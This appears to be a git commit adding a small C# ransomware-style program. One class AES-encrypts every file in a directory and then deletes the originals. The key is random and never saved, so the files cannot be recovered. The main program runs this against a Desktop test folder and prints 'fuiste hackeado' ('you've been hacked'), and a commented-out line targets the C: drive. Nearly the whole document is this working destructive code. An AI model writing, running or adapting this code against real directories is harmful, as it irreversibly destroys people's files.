b7259d1a7c39c470e153374718b132324f4b7326
CesarP <{ID}+{username}@users.noreply.github.com>
2023-11-27 21:13:49 -0400

    primer commit

---
+++ Class1.cs
@@ -0,0 +1,50 @@
+﻿using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Threading;
+
+
+namespace encryptfilesc
+{ 
+    public static class FileEncryptor
+    {
+        public static void EncryptFilesInDirectory(string directoryPath)
+        {
+            //string directoryPath = "C:\\";
+            // Get all files in the directory
+            string[] files = Directory.GetFiles(directoryPath);
+
+            // Create an instance of the AesCryptoServiceProvider
+            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
+            {
+                // Loop through each file and encrypt it
+                foreach (string file in files)
+                {
+                    // Read the file into a byte array
+                    byte[] fileBytes = File.ReadAllBytes(file);
+
+                    // Encrypt the file
+                    byte[] encryptedBytes = aes.CreateEncryptor().TransformFinalBlock(fileBytes, 0, fileBytes.Length);
+
+                    // Save the encrypted file with a different name
+                    string encryptedFilePath = Path.Combine(directoryPath, Path.GetFileNameWithoutExtension(file) + ".encrypted" + Path.GetExtension(file));
+                    File.WriteAllBytes(encryptedFilePath, encryptedBytes);
+                }
+            }
+        }
+        public static void DeleteUnencryptedFiles(string directoryPath)
+        {
+            // Get all files in the directory
+            string[] files = Directory.GetFiles(directoryPath);
+
+            // Loop through each file and delete it if it's not encrypted
+            foreach (string file in files)
+            {
+                if (!file.Contains(".encrypted"))
+                {
+                    File.Delete(file);
+                }
+            }
+        }
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,22 @@
+﻿using System;
+using System.Threading;
+using encrypt = encryptfilesc;
+
+namespace ejecutabledllc_
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
+            string finalPath = desktopPath + "\\pruebaxd";
+            string texto = "fuiste hackeado";
+            encrypt.FileEncryptor.EncryptFilesInDirectory(finalPath);
+            encrypt.FileEncryptor.DeleteUnencryptedFiles(finalPath);
+            Console.WriteLine(desktopPath);
+            Console.WriteLine(finalPath);
+            Console.WriteLine(texto);
+            Thread.Sleep(20000);
+        }
+    }
+}
